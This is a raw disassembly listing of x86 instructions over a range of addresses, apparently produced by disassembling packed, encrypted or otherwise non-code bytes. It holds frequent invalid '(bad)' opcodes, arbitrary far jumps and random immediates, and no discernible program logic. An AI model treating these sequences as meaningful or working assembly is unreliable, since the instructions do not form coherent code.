  416ca1:	gs stos BYTE PTR es:[edi],al
  416ca3:	test   BYTE PTR [eax],dl
  416ca5:	jo     0x416c8d
  416ca7:	sub    eax,0xf559d8aa
  416cac:	push   edx
  416cad:	pop    esi
  416cae:	pop    DWORD PTR [ebx+0x13]
  416cb1:	int3   
  416cb2:	push   edi
  416cb3:	clc    
  416cb4:	lea    eax,[eax]
	...
  416d16:	and    DWORD PTR [ebx-0x40445077],edx
  416d1c:	daa    
  416d1d:	lahf   
  416d1e:	or     DWORD PTR ds:0x6bc680c9,edi
  416d24:	stos   DWORD PTR es:[edi],eax
  416d25:	jne    0x416ced
  416d27:	out    dx,al
  416d28:	add    BYTE PTR [eax],al
  416d2a:	pop    es
  416d2b:	add    DWORD PTR [eax],eax
  416d2d:	add    BYTE PTR [ebx],bh
  416d2f:	imul   esp,DWORD PTR [ebp-0x6563c677],0x1a690ef3
  416d39:	push   ss
  416d3a:	push   0xffffffad
  416d3c:	mov    edi,0xeec6a1a2
  416d41:	dec    esp
  416d42:	cmp    al,0x7
  416d44:	ins    BYTE PTR es:[edi],dx
  416d45:	scas   al,BYTE PTR es:[edi]
  416d46:	inc    edi
  416d47:	or     DWORD PTR [ecx+edx*2],eax
  416d4a:	push   ss
  416d4b:	cmp    esp,ebx
  416d4d:	jmp    0xb407:0x31441d3b
  416d54:	xchg   esp,eax
  416d55:	loop   0x416d95
  416d57:	lahf   
  416d58:	in     eax,0x4d
  416d5a:	push   ecx
  416d5b:	mov    cl,0x2
  416d5d:	stos   DWORD PTR es:[edi],eax
  416d5e:	mov    ebp,edi
  416d60:	push   esp
  416d61:	(bad)  
  416d62:	push   edx
  416d63:	inc    ebp
  416d64:	adc    ah,bh
  416d66:	and    DWORD PTR [eax+0xd],ebp
  416d69:	jp     0x416d4f
  416d6b:	mov    eax,0x331881e0
  416d70:	pop    ebp
  416d71:	in     al,0xed
  416d73:	fwait
  416d74:	mov    esi,0x86917d1b
  416d79:	in     al,dx
  416d7a:	jno    0x416d56
  416d7c:	and    dh,BYTE PTR [ecx+0x25]
  416d7f:	aaa    
  416d80:	shr    BYTE PTR [eax],0x75
  416d83:	rcr    BYTE PTR ds:0xa5d40af0,1
  416d89:	jno    0x416dea
  416d8b:	mov    ds:0x7c1df52e,al
  416d90:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d92:	out    dx,eax
  416d93:	(bad)  
  416d94:	add    al,BYTE PTR [esi+0x1e]
  416d97:	cli    
  416d98:	cs inc esp
  416d9a:	xor    al,0xc0
  416d9c:	les    ecx,FWORD PTR [edi-0x66525b2b]
  416da2:	push   ebp
  416da3:	pop    ecx
  416da4:	jbe    0x416dae
  416da6:	(bad)  
  416da7:	jge    0x416d4a
  416da9:	sbb    al,0x37
  416dab:	repz jmp 0x416d4b
  416dae:	ret    0x9e37
  416db1:	jp     0x416dc0
  416db3:	add    BYTE PTR [esi-0x2e],ah
  416db6:	in     eax,dx
  416db7:	xor    al,0xc1
  416db9:	pop    ecx
  416dba:	mov    bl,0xcb
  416dbc:	icebp  
  416dbd:	xchg   ecx,eax
  416dbe:	push   ss
  416dbf:	leave  
  416dc0:	xchg   esi,eax
  416dc1:	stos   BYTE PTR es:[edi],al
  416dc2:	cli    
  416dc3:	int3   
  416dc4:	xchg   BYTE PTR [edx+0x52],cl
  416dc7:	sub    eax,DWORD PTR [edi+0x67e12145]
  416dcd:	cs mov edi,0x4fd5bfaa
  416dd3:	and    al,0x59
  416dd5:	xchg   ebp,eax
  416dd6:	xor    eax,DWORD PTR [edi+0x56232ba1]
  416ddc:	xor    eax,0x22ac704f
  416de1:	dec    ebp
  416de2:	xor    eax,0x50f394da
  416de7:	push   0x8678e430
  416dec:	mov    ds:0x5485d673,al
  416df1:	adc    dl,al
  416df3:	mov    esp,0x45471465
  416df8:	and    al,0xc5
  416dfa:	mov    ecx,0xe3d71ec4
  416dff:	and    DWORD PTR [ebx-0x1f550f0a],ebx
  416e05:	into   
  416e06:	fmul   DWORD PTR [ecx]
  416e08:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e0a:	in     eax,dx
  416e0b:	xchg   esp,eax
  416e0c:	mov    cl,0x14
  416e0e:	addr16 stc 
  416e10:	xlat   BYTE PTR ds:[ebx]
  416e11:	or     BYTE PTR ds:0x6787fec8,0xdc
  416e18:	sub    eax,0xfe358c46
  416e1d:	ins    DWORD PTR es:[edi],dx
  416e1e:	sbb    eax,0xf32c9728
  416e23:	les    esp,FWORD PTR [eax+0xb]
  416e26:	hlt    
  416e27:	fs push ebx
  416e29:	ret    
  416e2a:	aad    0xa5
  416e2c:	xor    al,0x57
  416e2e:	mov    BYTE PTR [ebx],al
  416e30:	and    eax,DWORD PTR [edi+0x37c2b2]
	...
  416e96:	mov    edi,0xae6d8e19
  416e9b:	(bad)  
  416e9c:	(bad)  
  416e9d:	(bad)  
  416e9f:	fstp   QWORD PTR [edx+ecx*8+0x3b487c5]
  416ea6:	int    0xef
  416ea8:	add    BYTE PTR [eax],al
  416eaa:	pop    es
  416eab:	add    DWORD PTR [eax],eax
  416ead:	add    dl,dl
  416eaf:	leave  
  416eb0:	xor    edi,ecx
  416eb2:	xor    eax,0xf82f554b
  416eb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416eb8:	adc    edi,DWORD PTR [edi+0x56930a54]
  416ebe:	fstp   DWORD PTR [edi+edi*4-0x544e1ac1]
  416ec5:	dec    ecx
  416ec6:	sub    edx,ecx
  416ec8:	or     BYTE PTR [ebx],cl
  416eca:	adc    bh,BYTE PTR [eax-0x32]
  416ecd:	sub    ecx,edx
  416ecf:	je     0x416e99
  416ed1:	or     al,0xc0
  416ed3:	frstor ss:[edi+esi*8-0xa4800d0]
  416edb:	call   0x9902:0xed764d7b
  416ee2:	ins    BYTE PTR es:[edi],dx
  416ee3:	jmp    0x416f19
  416ee5:	repnz std 
  416ee7:	hlt    
  416ee8:	cmp    eax,0xb03f79e2
  416eed:	sbb    eax,0x731b1d93
  416ef2:	rcpps  xmm0,XMMWORD PTR [ebx-0x7f]
  416ef6:	and    edi,DWORD PTR [edi]
  416ef8:	sub    DWORD PTR [esi-0x1381a965],edi
  416efe:	add    dl,al
  416f00:	icebp  
  416f01:	dec    ebx
  416f02:	add    bh,dh
  416f04:	mov    ah,0xec
  416f06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f07:	and    DWORD PTR [edx-0x3bf08792],eax
  416f0d:	and    ebx,edx
  416f0f:	ror    DWORD PTR [esi+esi*2+0x64de8f49],0x3b
  416f17:	out    dx,al
  416f18:	sbb    dh,BYTE PTR [ebx+eax*8-0x5a4ff6be]
  416f1f:	ss jae 0x416f64
  416f22:	cmp    BYTE PTR [eax+edx*2],dh
  416f25:	popa   
  416f26:	sbb    eax,0xd6a27fd9
  416f2b:	pop    edx
  416f2c:	or     edi,esp
  416f2e:	jmp    0x62d0e115
  416f33:	cli    
  416f34:	rcr    BYTE PTR [ebx+0x38],1
  416f37:	aam    0x4a
  416f39:	jb     0x416f65
  416f3b:	sub    BYTE PTR [edi+ebp*1+0x5e],al
  416f3f:	in     al,dx
  416f40:	mov    dl,bh
  416f42:	neg    BYTE PTR [ebx-0x6e9cb562]
  416f48:	add    al,0x3a
  416f4a:	es repnz mov bl,0x71
  416f4e:	jb     0x416f1b
  416f50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f51:	mov    al,ds:0xeac8d77f
  416f56:	aad    0x1e
  416f58:	pusha  
  416f59:	ss xor ebp,edx
  416f5c:	add    ch,BYTE PTR es:[edi-0x12c4c975]
  416f63:	scas   al,BYTE PTR es:[edi]
  416f64:	push   0x3b
  416f66:	aam    0x31
  416f68:	xchg   ebx,eax
  416f69:	adc    DWORD PTR [ecx],edx
  416f6b:	xchg   DWORD PTR [ebp-0x5240093d],edx
  416f71:	cld    
  416f72:	shl    BYTE PTR [edi],1
  416f74:	mov    al,ds:0x3822d34e
  416f79:	jne    0x416f7b
  416f7b:	(bad)  
  416f7c:	mov    edi,0x9c658451
  416f81:	adc    eax,DWORD PTR [ecx+ecx*2-0x1a698e2d]
  416f88:	xlat   BYTE PTR ds:[ebx]
  416f89:	arpl   WORD PTR [edi-0x20],sp
  416f8c:	(bad)  
  416f8e:	push   edi
  416f8f:	loope  0x416f19
  416f91:	loopne 0x41700d
  416f93:	(bad)  
  416f94:	sbb    BYTE PTR [edi+0x771bc209],al
  416f9a:	dec    edx
  416f9b:	mov    eax,0xc92639d
  416fa0:	inc    eax
  416fa1:	shl    DWORD PTR [ebx],1
  416fa3:	mov    eax,ebp
  416fa5:	jmp    0x416fe0
  416fa7:	in     al,0x8d
  416fa9:	ins    BYTE PTR es:[edi],dx
  416faa:	xor    al,0x6e
  416fac:	pop    esp
  416fad:	in     eax,dx
  416fae:	fs ret 0xb56d
  416fb2:	cmp    DWORD PTR [edx+0x1],ebx
	...
  417014:	add    BYTE PTR [eax],al
  417016:	jbe    0x417045
  417018:	push   ebp
  417019:	inc    ecx
  41701a:	pop    edi
  41701b:	jns    0x417093
  41701d:	aas    
  41701e:	lods   al,BYTE PTR ds:[esi]
  41701f:	fmul   QWORD PTR [eax-0x50]
  417022:	arpl   bx,si
  417024:	fs stos BYTE PTR es:[edi],al
  417026:	aam    0xf0
  417028:	add    BYTE PTR [eax],al
  41702a:	pop    es
  41702b:	add    DWORD PTR [eax],eax
  41702d:	add    BYTE PTR [edx+esi*1-0x6fc4314c],cl
  417034:	mov    al,0x22
  417036:	fdiv   QWORD PTR [ebx-0x79]
  417039:	(bad)  
  41703a:	push   edi
  41703b:	ret    0x5901
  41703e:	add    eax,0x9133d93b
  417043:	call   0x7f921c68
  417048:	sbb    BYTE PTR [ecx-0x147f4111],ch
  41704e:	daa    
  41704f:	in     ax,0xe7
  417052:	and    BYTE PTR [edx],bl
  417054:	dec    ebx
  417055:	leave  
  417056:	lods   eax,DWORD PTR ds:[esi]
  417057:	xchg   edx,eax
  417058:	inc    eax
  417059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41705a:	adc    DWORD PTR ds:0xe7054f0d,esi
  417060:	sbb    ebp,eax
  417062:	mov    eax,ds:0x3c7ce6f4
  417067:	mov    esi,0xc6934eda
  41706c:	ror    bl,cl
  41706e:	xlat   BYTE PTR ds:[ebx]
  41706f:	mov    DWORD PTR [ebx+0x439cfe52],ebx
  417075:	mov    edi,0x1b82fd82
  41707a:	jmp    0x4170ba
  41707c:	cwde   
  41707d:	cmp    cl,ch
  41707f:	mov    ecx,0xd7262eee
  417084:	inc    edi
  417085:	pop    ss
  417086:	mov    BYTE PTR [edi+0x1787df4a],ah
  41708c:	sbb    ah,0x5f
  41708f:	(bad)  
  417090:	(bad)  
  417092:	in     al,0x2c
  417094:	sbb    esp,ebp
  417096:	mov    bl,0xb4
  417098:	xchg   DWORD PTR [ebx-0x80],ebp
  41709b:	imul   eax,esi,0x52
  41709e:	push   ebx
  41709f:	or     bh,BYTE PTR [edx]
  4170a1:	cwde   
  4170a2:	fiadd  WORD PTR [eax]
  4170a4:	cwde   
  4170a5:	imul   esi,esi,0x2e3bf7f3
  4170ab:	sar    esp,0xd5
  4170ae:	iret   
  4170af:	not    esi
  4170b1:	inc    ebx
  4170b2:	xor    DWORD PTR [esi-0x3d],0xffffff86
  4170b6:	jne    0x417038
  4170b8:	scas   eax,DWORD PTR es:[edi]
  4170b9:	mov    BYTE PTR [esi+ebx*2],cl
  4170bc:	xchg   edi,eax
  4170bd:	mov    ds:0xc5beafa7,al
  4170c2:	push   ds
  4170c3:	jbe    0x417114
  4170c5:	out    0xf5,al
  4170c7:	inc    edi
  4170c8:	fld    TBYTE PTR [ebp+0x1d]
  4170cb:	clc    
  4170cc:	iret   
  4170cd:	inc    esp
  4170ce:	mov    ds,ebp
  4170d0:	mov    eax,ds:0x338ddd43
  4170d5:	(bad)  
  4170d6:	shl    cl,cl
  4170d8:	clc    
  4170d9:	add    DWORD PTR [ecx],ecx
  4170db:	pop    ss
  4170dc:	dec    ecx
  4170dd:	xlat   BYTE PTR ds:[ebx]
  4170de:	lods   eax,DWORD PTR ds:[esi]
  4170df:	je     0x417120
  4170e1:	push   ebx
  4170e2:	inc    esp
  4170e3:	adc    DWORD PTR [ecx+edi*1-0x2f],ebp
  4170e7:	fist   DWORD PTR [ecx-0x39823d9a]
  4170ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170ee:	inc    ebx
  4170ef:	xor    cl,BYTE PTR [edi]
  4170f1:	repz mov edi,0xd2e6a62e
  4170f7:	(bad)  
  4170f8:	cwde   
  4170f9:	test   BYTE PTR [eax+0x6d9e3229],ah
  4170ff:	jle    0x4170c4
  417101:	loope  0x417086
  417103:	jmp    0x4c3c:0xd3dd0445
  41710a:	imul   ebp,DWORD PTR [ecx+0x2],0x1b147dce
  417111:	stc    
  417112:	push   eax
  417113:	outs   dx,DWORD PTR ds:[esi]
  417114:	pop    ecx
  417115:	and    eax,DWORD PTR [eax]
  417117:	xor    DWORD PTR [ebx],0xe007453a
  41711d:	mov    cl,BYTE PTR [ebx+0x21c857d4]
  417123:	cmp    cl,cl
  417125:	ins    DWORD PTR es:[edi],dx
  417126:	mov    cl,0xc2
  417128:	fwait
  417129:	lods   al,BYTE PTR ds:[esi]
  41712a:	add    eax,0xb8ee0dc8
  41712f:	mov    edi,DWORD PTR [ecx-0x19]
  417132:	std    
  417133:	and    eax,esp
	...
  417195:	add    BYTE PTR [esi-0xe58fe7],ah
  41719b:	jnp    0x41718b
  41719d:	mov    ebp,0x5dd8ff3
  4171a2:	mov    ch,0x58
  4171a4:	mov    WORD PTR [ecx+0xf1db],?
  4171aa:	pop    es
  4171ab:	add    DWORD PTR [eax],eax
  4171ad:	add    BYTE PTR [ebx+0x5d],cl
  4171b0:	jne    0x4171c1
  4171b2:	sub    BYTE PTR [edx-0x7ca5786d],ch
  4171b8:	adc    eax,0xa6f956cc
  4171bd:	pop    edx
  4171be:	push   cs
  4171bf:	pop    ebx
  4171c0:	jmp    0x1eb6:0x844049ea
  4171c7:	jge    0x417162
  4171c9:	scas   eax,DWORD PTR es:[edi]
  4171ca:	gs mov ecx,0xedc3b958
  4171d0:	push   ds
  4171d1:	int    0x96
  4171d3:	xor    eax,0x3511c5ef
  4171d8:	add    ah,al
  4171da:	push   ss
  4171db:	sahf   
  4171dc:	loopne 0x4171b2
  4171de:	pop    ebp
  4171df:	jno    0x41719f
  4171e1:	(bad)  
  4171e2:	mov    edx,0xe816bef2
  4171e7:	pop    ebp
  4171e8:	push   ecx
  4171e9:	jns    0x417219
  4171eb:	jnp    0x41717a
  4171ed:	or     BYTE PTR [esi-0x21c42d2c],bl
  4171f3:	or     DWORD PTR [edi-0x471a3323],esp
  4171f9:	in     eax,0x1e
  4171fb:	pop    eax
  4171fc:	mov    ds:0xd1ab6da6,al
  417201:	jns    0x417216
  417203:	cmp    DWORD PTR ds:0xab1bbc27,0xffffffa7
  41720a:	fidiv  DWORD PTR [eax+edx*1]
  41720d:	adc    al,bl
  41720f:	(bad)  
  417210:	repz data16 aad 0xe4
  417214:	fs je  0x417206
  417217:	addr16 xor eax,0xe06350d7
  41721d:	xchg   DWORD PTR [ebp-0x34],edi
  417220:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417221:	xor    DWORD PTR [edi],edx
  417223:	pop    ds
  417224:	test   BYTE PTR [edi+0x27],bh
  417227:	cdq    
  417228:	sbb    eax,0x21682afd
  41722d:	int3   
  41722e:	retf   0x8deb
  417231:	and    BYTE PTR [edx+0x1c5964f0],cl
  417237:	imul   esp,DWORD PTR [esi+0x6b],0x5f71b515
  41723e:	cdq    
  41723f:	fld    TBYTE PTR [esi-0x2d54f8fe]
  417245:	sbb    BYTE PTR [edx],ch
  417247:	sbb    eax,0x20b2f673
  41724c:	xor    al,0x1c
  41724e:	(bad)
  417251:	data16 mov ah,0x58
  417254:	in     eax,dx
  417255:	add    DWORD PTR [esp+ecx*2-0x55],ebx
  417259:	xor    eax,0x890c6978
  41725e:	stos   BYTE PTR es:[edi],al
  41725f:	push   cs
  417260:	ror    edi,1
  417262:	in     al,dx
  417263:	push   0xbe1a193c
  417268:	cmp    ah,BYTE PTR [ecx-0x7eb7a9b7]
  41726e:	add    ah,dh
  417270:	mov    ecx,0x4f058563
  417275:	jp     0x417273
  417277:	retf   
  417278:	rcr    BYTE PTR [eax+0x69],1
  41727b:	push   esi
  41727c:	lock lods al,BYTE PTR ds:[esi]
  41727e:	dec    edi
  41727f:	cwde   
  417280:	mov    ch,0x58
  417282:	nop
  417283:	mov    ss,WORD PTR [edi*2+0x5f069813]
  41728a:	es std 
  41728c:	jb     0x4172eb
  41728e:	(bad)  [edx-0x40]
  417291:	call   0x3a1c:0x8def1f62
  417298:	sar    BYTE PTR [edi],1
  41729a:	std    
  41729b:	dec    ecx
  41729c:	push   ds
  41729d:	fisttp WORD PTR [edx+0xc1f2f24]
  4172a3:	mov    bh,BYTE PTR [edi+0x13]
  4172a6:	imul   ebx,DWORD PTR [ecx+0x36],0xffffffc0
  4172aa:	dec    eax
  4172ab:	rcr    BYTE PTR [edx],0x1d
  4172ae:	adc    eax,0xe4af6e28
  4172b3:	daa    
  4172b4:	dec    ebx
	...
  417315:	add    BYTE PTR [ecx-0x44],ch
  417318:	xlat   BYTE PTR ds:[ebx]
  417319:	pop    esi
  41731a:	xlat   BYTE PTR ds:[ebx]
  41731b:	jg     0x417306
  41731d:	mov    edi,0x85e5bf4a
  417322:	adc    al,0xcc
  417324:	mov    dl,0x2d
  417326:	loop   0x41731a
  417328:	add    BYTE PTR [eax],al
  41732a:	pop    es
  41732b:	add    DWORD PTR [eax],eax
  41732d:	add    ch,ch
  41732f:	sahf   
  417330:	cmc    
  417331:	xor    eax,0x612322e8
  417336:	add    ch,0x90
  417339:	call   0xe8d55b32
  41733e:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  417340:	adc    eax,0xd811467d
  417345:	leave  
  417346:	push   edi
  417347:	pop    es
  417348:	je     0x417395
  41734a:	inc    ecx
  41734b:	jno    0x4172e4
  41734d:	ror    BYTE PTR [ecx+0x78892ff8],0x7
  417354:	sbb    BYTE PTR [ecx],dh
  417356:	aas    
  417357:	sub    al,0xad
  417359:	call   0xcd4e:0x74b49896
  417360:	call   0xb3dfe3a0
  417365:	sub    bh,ch
  417367:	push   cs
  417368:	jbe    0x417309
  41736a:	jno    0x4173dd
  41736c:	(bad)  [ebx]
  41736e:	push   edx
  41736f:	inc    eax
  417370:	sub    edx,edx
  417372:	(bad)  
  417373:	pop    ds
  417374:	mov    ecx,0x36e8b35
  417379:	fcom   DWORD PTR [ebp+eax*2+0x3]
  41737d:	xchg   ecx,eax
  41737e:	out    0xbd,al
  417380:	popa   
  417381:	sbb    dl,BYTE PTR [esi]
  417383:	stos   BYTE PTR es:[edi],al
  417384:	les    eax,FWORD PTR [esi]
  417386:	pop    esp
  417387:	dec    edi
  417388:	jg     0x4173c6
  41738a:	bsf    ecx,DWORD PTR [ebx+esi*2+0x58]
  41738f:	rcr    BYTE PTR [edi-0x1f8bdf48],1
  417395:	push   edx
  417396:	adc    esp,ebx
  417398:	rcl    DWORD PTR [esi],0x75
  41739b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41739c:	mov    ch,BYTE PTR [esi-0xafcc279]
  4173a2:	xor    BYTE PTR [ebx],0x60
  4173a5:	sub    BYTE PTR [ebp-0x1952f6c],dh
  4173ab:	test   eax,0xbf38e1ee
  4173b0:	ins    BYTE PTR es:[edi],dx
  4173b1:	sar    DWORD PTR [esi+0x9],1
  4173b4:	out    dx,eax
  4173b5:	mov    ecx,?
  4173b7:	dec    eax
  4173b8:	fimul  DWORD PTR [edx]
  4173ba:	xchg   ebx,eax
  4173bb:	dec    edx
  4173bc:	pop    esp
  4173bd:	(bad)  
  4173be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173bf:	cwde   
  4173c0:	(bad)  
  4173c1:	data16 mov al,0xbd
  4173c4:	dec    esi
  4173c5:	leave  
  4173c6:	xor    BYTE PTR [eiz*8-0x525aa5f0],cl
  4173cd:	cmp    edx,esp
  4173cf:	imul   edx,DWORD PTR [ebx+0x1159274f],0x1f
  4173d6:	test   BYTE PTR [ecx],0x3f
  4173d9:	leave  
  4173da:	sub    eax,0x8cdb0c3
  4173df:	xor    ebp,DWORD PTR [edi]
  4173e1:	retf   0xb810
  4173e4:	jno    0x41738d
  4173e6:	xchg   edx,eax
  4173e7:	or     DWORD PTR [edx-0x53913efd],0xffffffb4
  4173ee:	std    
  4173ef:	or     al,0x31
  4173f1:	xor    esp,edi
  4173f3:	std    
  4173f4:	clc    
  4173f5:	shr    DWORD PTR [ebp+0x5179c2f],1
  4173fb:	jno    0x4173ec
  4173fd:	ror    DWORD PTR [esi],1
  4173ff:	pop    ecx
  417400:	or     BYTE PTR [ebp+0x2cf9b602],0x60
  417407:	mov    esi,0x7f078a78
  41740c:	dec    eax
  41740d:	pop    esp
  41740e:	add    DWORD PTR [esp+ecx*1+0x2bbeb806],0x41
  417416:	aam    0x38
  417418:	push   edx
  417419:	jne    0x417421
  41741b:	jp     0x417412
  41741d:	sbb    ecx,edi
  41741f:	pusha  
  417420:	pop    ds
  417421:	mov    ecx,0x2af7a4d
  417426:	sbb    esi,ebp
  417428:	add    esi,edx
  41742a:	dec    edx
  41742b:	or     al,0xd8
  41742d:	(bad)  
  41742e:	imul   ecx,DWORD PTR [esi+ecx*8],0x879a9970
	...
  417495:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  41749b:	fdivr  st(7),st
  41749d:	mov    edi,0x6bda61d2
  4174a2:	pop    ecx
  4174a3:	test   bh,bh
  4174a5:	inc    esi
  4174a6:	jmp    0x741759e
  4174ab:	add    DWORD PTR [eax],eax
  4174ad:	add    BYTE PTR [ebx],dh
  4174af:	xor    DWORD PTR [ecx-0x6e],esi
  4174b2:	mov    edx,0x62bee4b2
  4174b7:	dec    esi
  4174b8:	push   ss
  4174b9:	rcl    BYTE PTR [esi+0x6e31f774],0x7b
  4174c0:	and    al,0x11
  4174c2:	mov    ch,0xd0
  4174c4:	pop    es
  4174c5:	call   0x67f7e48f
  4174ca:	int    0x5d
  4174cc:	rol    BYTE PTR [edi-0x13],0x2d
  4174d0:	push   0x196b539b
  4174d5:	jns    0x41748a
  4174d7:	mov    cs:0x422025f3,eax
  4174dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174de:	dec    esp
  4174df:	pushf  
  4174e0:	mov    DWORD PTR [edi],eax
  4174e2:	mov    ebp,0x7bac4f50
  4174e7:	cli    
  4174e8:	mov    BYTE PTR [ebx],bh
  4174ea:	lods   al,BYTE PTR ds:[esi]
  4174eb:	push   edi
  4174ec:	and    al,BYTE PTR [edx-0x59]
  4174ef:	xchg   esp,eax
  4174f0:	sbb    eax,0x76d1091b
  4174f5:	test   BYTE PTR [edi+ebx*2-0x26],dl
  4174f9:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174fb:	inc    eax
  4174fc:	mov    cl,0xf3
  4174fe:	and    BYTE PTR [esi],bl
  417500:	std    
  417501:	dec    ebp
  417502:	je     0x41749c
  417504:	rol    BYTE PTR [ebx],cl
  417506:	xor    edx,esp
  417508:	(bad)  
  417509:	sub    dh,BYTE PTR [edi]
  41750b:	cld    
  41750c:	pusha  
  41750d:	je     0x4174d1
  41750f:	jns    0x41753e
  417511:	dec    ebp
  417512:	neg    BYTE PTR [edi+0x5f]
  417515:	pushf  
  417516:	rcr    DWORD PTR [edi-0xf],1
  417519:	pop    ss
  41751a:	out    dx,al
  41751b:	aas    
  41751c:	test   al,0xd3
  41751e:	sahf   
  41751f:	stos   DWORD PTR es:[edi],eax
  417520:	pushw  cs
  417522:	test   bl,ch
  417524:	jo     0x417558
  417526:	in     al,dx
  417527:	call   0xbed4e966
  41752c:	int    0x5b
  41752e:	ret    
  41752f:	lea    ebp,ds:0x3c3671ce
  417535:	mov    ah,0x23
  417537:	pop    edi
  417538:	fisub  DWORD PTR [edx-0x5b]
  41753b:	add    eax,0xfd85c50f
  417540:	mov    edx,0xd7450fe
  417545:	add    DWORD PTR [esi+eiz*4+0x7],ebp
  417549:	jbe    0x417547
  41754b:	or     al,0xa3
  41754d:	addr16 mov al,ds:0x214f
  417551:	and    eax,0xb4620e98
  417556:	mov    bl,0x4b
  417558:	dec    ebp
  417559:	test   DWORD PTR [ebx+0x27],0x8c4e4994
  417560:	xchg   DWORD PTR [esi],ebx
  417562:	push   ss
  417563:	punpckhbw mm2,mm4
  417566:	xchg   DWORD PTR [edx+0x2],edi
  417569:	arpl   WORD PTR [edx],bp
  41756b:	(bad)  
  41756c:	std    
  41756d:	mov    ebp,0x9a42c70c
  417572:	sbb    DWORD PTR [edi-0x731a4fe4],ebx
  417578:	imul   edi,DWORD PTR [ebx-0x533de8cb],0xbe839194
  417582:	js     0x4175d9
  417584:	mov    dh,0x75
  417586:	ja     0x417532
  417588:	and    BYTE PTR [ebp+edx*2+0x705adafd],cl
  41758f:	sahf   
  417590:	sub    cl,BYTE PTR [esi-0x73d315f5]
  417596:	rcr    BYTE PTR [edi],0x8e
  417599:	stos   BYTE PTR es:[edi],al
  41759a:	mov    ebp,0x223db69a
  41759f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175a0:	mov    al,0xf8
  4175a2:	mov    dl,0x66
  4175a4:	and    al,0xdc
  4175a6:	scas   eax,DWORD PTR es:[edi]
  4175a7:	(bad)  
  4175a8:	adc    ebp,eax
  4175aa:	scas   eax,DWORD PTR es:[edi]
  4175ab:	push   ebx
  4175ac:	jns    0x417541
  4175ae:	jno    0x417615
  4175b0:	jl     0x417616
  4175b2:	cld    
  4175b3:	retf   0xa9
	...
  417616:	test   eax,0xdf4fd367
  41761b:	(bad)  
  41761c:	mov    ebp,0x670b0ae7
  417621:	fadd   DWORD PTR [edi-0xf537cec]
  417627:	hlt    
  417628:	add    BYTE PTR [eax],al
  41762a:	pop    es
  41762b:	add    DWORD PTR [eax],eax
  41762d:	add    BYTE PTR [eax],cl
  41762f:	sub    DWORD PTR [ebx],ebp
  417631:	push   ds
  417632:	pop    es
  417633:	add    bl,BYTE PTR [edi+0x7e89454b]
  417639:	or     al,0x82
  41763b:	aaa    
  41763c:	xor    DWORD PTR [edi],0xffffff82
  41763f:	addr16 es in al,0x6c
  417643:	cmp    al,0xb0
  417645:	loop   0x417691
  417647:	xchg   esp,eax
  417648:	mov    al,ds:0x513bc6f3
  41764d:	loop   0x41769d
  41764f:	push   ebx
  417650:	push   eax
  417651:	push   DWORD PTR [edi]
  417653:	sub    dl,BYTE PTR [ecx+0x58823d5b]
  417659:	out    0xc8,eax
  41765b:	mov    al,0xcf
  41765d:	aas    
  41765e:	pop    ecx
  41765f:	push   ebp
  417660:	mov    dh,0x19
  417662:	cmp    ebp,esp
  417664:	xchg   ebp,eax
  417665:	leave  
  417666:	or     al,ch
  417668:	adc    BYTE PTR [ecx],bh
  41766a:	(bad)  
  41766b:	ss push cs
  41766d:	mov    ch,0x36
  41766f:	inc    ecx
  417670:	xchg   edx,eax
  417671:	jle    0x4175fd
  417673:	jmp    0xb627:0xf19a4aee
  41767a:	dec    edx
  41767b:	lock inc ebx
  41767d:	xlat   BYTE PTR ds:[ebx]
  41767e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41767f:	(bad)  
  417680:	shr    ebx,cl
  417682:	jbe    0x417662
  417684:	sub    ah,bh
  417686:	push   0x138a9182
  41768b:	dec    edi
  41768c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41768d:	or     DWORD PTR ds:0x48419bc1,esp
  417693:	cmp    BYTE PTR [ecx-0x4e84ca5d],ch
  417699:	cmc    
  41769a:	cmp    ecx,DWORD PTR ds:0xca49af74
  4176a0:	push   cs
  4176a1:	(bad)  [ebp-0x41f205ef]
  4176a7:	adc    bh,BYTE PTR [ebx]
  4176a9:	sbb    ch,BYTE PTR [esi+0x61]
  4176ac:	paddq  mm4,mm6
  4176af:	mov    dh,0x79
  4176b1:	push   ds
  4176b2:	(bad)  
  4176b3:	fmul   st(7),st
  4176b5:	out    dx,al
  4176b6:	ins    BYTE PTR es:[edi],dx
  4176b7:	arpl   di,si
  4176b9:	add    BYTE PTR [ebx],bl
  4176bb:	lods   eax,DWORD PTR ds:[esi]
  4176bc:	sbb    bl,BYTE PTR [edi]
  4176be:	ficom  WORD PTR [ebx+0x73]
  4176c1:	sub    al,0xf9
  4176c3:	sbb    edi,DWORD PTR [esi-0x77b87c2a]
  4176c9:	aam    0xe6
  4176cb:	shl    DWORD PTR [ebx-0x31],cl
  4176ce:	push   esp
  4176cf:	xchg   edx,eax
  4176d0:	shl    esi,0xea
  4176d3:	fdiv   st(1),st
  4176d5:	aam    0x11
  4176d7:	sbb    BYTE PTR [ebx-0x53],ch
  4176da:	inc    edi
  4176db:	(bad)  
  4176dc:	lds    ebp,FWORD PTR [ebp+0x4eb418a8]
  4176e2:	sbb    eax,0xfa798da2
  4176e7:	xor    BYTE PTR [edx+0x13391d2e],bl
  4176ed:	dec    ecx
  4176ee:	adc    DWORD PTR ss:[edx-0x38],eax
  4176f2:	adc    BYTE PTR ds:0x8cb15f12,ch
  4176f8:	mov    cl,0xf5
  4176fa:	mul    ebp
  4176fc:	(bad)  
  4176fd:	in     eax,0x15
  4176ff:	ja     0x4176a2
  417701:	push   eax
  417702:	data16 mov ah,0x16
  417705:	push   ecx
  417706:	cld    
  417707:	xchg   edi,eax
  417708:	adc    DWORD PTR [edx],edi
  41770a:	jmp    0x41775f
